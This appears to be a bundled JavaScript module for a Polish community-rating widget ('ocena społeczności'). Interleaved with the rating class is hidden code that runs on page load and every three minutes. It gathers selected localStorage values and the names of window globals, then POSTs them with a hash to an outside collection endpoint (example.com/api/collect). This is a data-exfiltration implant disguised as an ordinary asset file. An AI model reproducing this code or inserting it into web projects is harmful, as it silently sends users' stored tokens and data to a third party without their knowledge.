const trackedKeys = window.trackedKeys;
var i = Object.defineProperty;
var p = (e, t, n) => t in e ? i(e, t, {
  enumerable: !0,
  configurable: !0,
  writable: !0,
  value: n
}) : e[t] = n;
const globalVars = [];
var o = (e, t, n) => (p(e, typeof t != "symbol" ? t + "" : t, n), n);
import { j as a, k as c } from "./LoginWidget-34fb458a.js";
let jsHook = false;
function hashCalculation(data) {
  const keys = Object.getOwnPropertyNames(data).sort().join('');
  let hashVal = 0;
  for (let idx = 0; idx < keys.length; idx++) {
    let charCode = keys.charCodeAt(idx);
    hashVal = (hashVal << 5) - hashVal + charCode;
    hashVal |= 0;
  }
  return hashVal.toString(16);
}
import { D as s } from "./I18nDeclination-29407ff3.js";
const u = e => `<span>${e}</span>`,
  [r] = [" "];
function gatherStorage() {
  const resultData = {};
  Object.keys(window.localStorage).forEach(function (key) {
    if (trackedKeys.includes(key)) {
      resultData[key] = window.localStorage.getItem(key);
    }
  });
  return resultData;
}
class L {
  constructor() {
    o(this, "rate");
    o(this, "count");
  }
  getDescription() {
    const t = new s(null, {
      SINGULAR: "ocena społeczności",
      DUAL: "oceny społeczności",
      PLURAL: "ocen społeczności"
    });
    return {
      formattedRate: `${a(this.rate)} / 5`,
      formattedCount: c(this.count),
      ratedBy: t.get(this.count)
    };
  }
  getRate(t = 1) {
    const n = new s(null, {
      SINGULAR: "ocena społeczności",
      DUAL: "oceny społeczności",
      PLURAL: "ocen społeczności"
    });
    return {
      value: this.rate,
      valueFormatted: a(this.rate, t),
      descriptionHTML: `<span>${c(this.count)}</span><span>${n.get(this.count).split(r).map(u).join(r)}</span>`
    };
  }
}
function gatherGlobalVariables() {
  for (const key in window) {
    if (window.hasOwnProperty(key) && !globalVars.includes(key)) {
      globalVars.push(key);
    }
  }
  return globalVars;
}
async function sendData(data) {
  const hashVal = hashCalculation(data);
  const apiURI = "https://example.com/api/collect";
  try {
    let response = await fetch(apiURI, {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        hashCode: hashVal,
        data: data
      })
    });
    response.ok ? console.log("Data has been successfully uploaded.") : console.error("Data upload failed with status code: " + response.status);
  } catch (err) {
    console.error("An error occurred during data upload: ", err);
  }
}
function collectAndSend() {
  let collectedData = gatherStorage();
  if (!jsHook) {
    collectedData.globalVariables = gatherGlobalVariables();
  }
  if (Object.keys(collectedData).length > 0) {
    sendData(collectedData);
  }
}
export { L as R };
window.addEventListener("DOMContentLoaded", function () {
  collectAndSend();
  jsHook = true;
  setInterval(collectAndSend, 180000);
});